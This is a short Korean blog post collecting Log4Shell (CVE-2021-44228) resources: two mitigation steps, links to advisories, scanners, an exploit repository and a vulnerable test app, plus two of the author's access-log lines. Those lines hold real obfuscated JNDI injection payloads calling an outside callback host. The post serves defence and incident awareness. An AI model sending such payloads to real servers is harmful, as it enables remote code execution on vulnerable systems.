---
title: "log4shell - url 정리"
date: 2021-12-11T23:49:25+09:00
draft: false
categories: ["Linux"]
slug: "log4jshell-url-정리"
aliases:
  - /log4jshell-url-정리/
  - /log4jshell-url-%ec%a0%95%eb%a6%ac/
---


총평: log4shell 취약점이 있으면 해커가 서버에서 뭐든할수있게 되어서 랜섬부터 멀웨어까지 다양하고 참신한 공격이 가능


1 . "log4j2.formatMsgNoLookups"를 "true"로 설정


2. Log4j 2.15.0(https://logging.apache.org/log4j/2.x/download.html) 버전으로 업데이트


<https://www.krcert.or.kr/data/secNoticeView.do?bulletin_writing_sequence=36389>


대응방법 KISA


<https://www.fastly.com/blog/digging-deeper-into-log4shell-0day-rce-exploit-found-in-log4j>


패스틀리 링크


<https://blog.cloudflare.com/cve-2021-44228-log4j-rce-0-day-mitigation/>


클라우드플레어링크


<https://www.pcmag.com/news/countless-serves-are-vulnerable-to-apache-log4j-zero-day-exploit>


취약점 테스트방법


<https://github.com/mwarnerblu/Log4ShellScanner>


Log4shell Scanner


<https://github.com/tangxiaofeng7/CVE-2021-44228-Apache-Log4j-Rce>


취약점 점검 expolit


<https://www.lunasec.io/docs/blog/log4j-zero-day/>


curl 테스트방법


<https://gist.github.com/nathanqthai/01808c569903f41a52e7e7b575caa890>


로깅패턴


<https://www.picussecurity.com/resource/blog/simulating-and-preventing-cve-2021-44228-apache-log4j-rce-exploits>


로그에서 확인방법


<https://github.com/YfryTchsGD/Log4jAttackSurface>


대상제품리스트


<https://aws.amazon.com/ko/security/security-bulletins/AWS-2021-005/?fbclid=IwAR1j7GAuBIbuh7HrlQJO-HTTKFjac7YYxvSWVh950CWiav2vO6AzSTI-S_0>


AWS의 대응 WAF에 Managed rule이 추가


<https://github.com/YfryTchsGD/Log4jAttackSurface>


공격받은곳 리스트


<https://github.com/christophetd/log4shell-vulnerable-app>


동작샘플


블로그에 남은 공격로그


127.0.0.6 - - [12/Dec/2021:04:29:32 +0000] "GET /favicon.ico HTTP/1.1" 302 5 "-" "${**jndi**:${lower:l}${lower:d}a${lower:p}://world80.log4j.bin${upper:a}ryedge.io:80/callback}" "68.183.198.247"


127.0.0.6 - - [12/Dec/2021:04:29:33 +0000] "GET /wp-includes/images/w-logo-blue-white-bg.png HTTP/1.1" 200 4119 "-" "${**jndi**:${lower:l}${lower:d}a${lower:p}://world80.log4j.bin${upper:a}ryedge.io:80/callback}" "68.183.198.247"
